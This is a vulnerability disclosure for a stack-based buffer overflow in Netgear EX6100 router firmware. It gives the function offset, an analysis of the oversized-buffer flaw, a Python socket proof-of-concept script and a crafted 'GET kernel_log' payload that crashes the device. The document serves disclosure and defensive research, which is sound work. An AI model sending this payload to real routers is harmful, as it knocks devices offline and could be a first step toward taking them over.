# Overview
Details of the vulnerability found in the netgear router ex6100.

| Firmware Name  | Firmware Version  | Download Link  |
| -------------- | ----------------- | -------------- |
| ex6100    | V1.0.2.28_1.1.138    | https://www.downloads.netgear.com/files/GDC/EX6100/EX6100-V1.0.2.28_1.1.138.zip   |




# Vulnerability details
## 1. Vulnerability trigger Location
A stack-based buffer overflow vulnerability exists in the function sub_415EF8 at offset 0x004164A0, where the strcat function is called without proper bounds checking. A specially crafted GET request can trigger the overflow.
![Vulnerability Trigger Location](./assets/1.png)

## 2. Vulnerability  Analysis
- The vulnerability is triggered during the parsing of a user's GET request when the request header contains `GET kernel_log`.
![second](./assets/2.png)
- Since the program uses `memset(&v23[6], 0, 94);`, the maximum size of the `v23` buffer is effectively limited to 100 bytes. Therefore, if the data following the GET request exceeds this limit, a stack-based buffer overflow can occur.


# POC
## python script
```python
import socket

host = "172.17.0.7"
port = 80
file = "../crashes/payload.txt"
f = open(file, "rb")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

request = f.read()

s.send(request)

response = s.recv(4096)

print(response.decode())

s.close()
```
## payload.txt

**Note the use of CRLF (Carriage Return and Line Feed) for line breaks.**
```
GET kernel_log.s:GEToEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE%EEEEEEEEEEEEEEEEEE  wLG_wifi_sc}e_set.htm 3


```

# Vulnerability Verification Screenshot
##  ex6100
![3.png](./assets/3.png)

# Discoverer
m202472188@hust.edu.cn
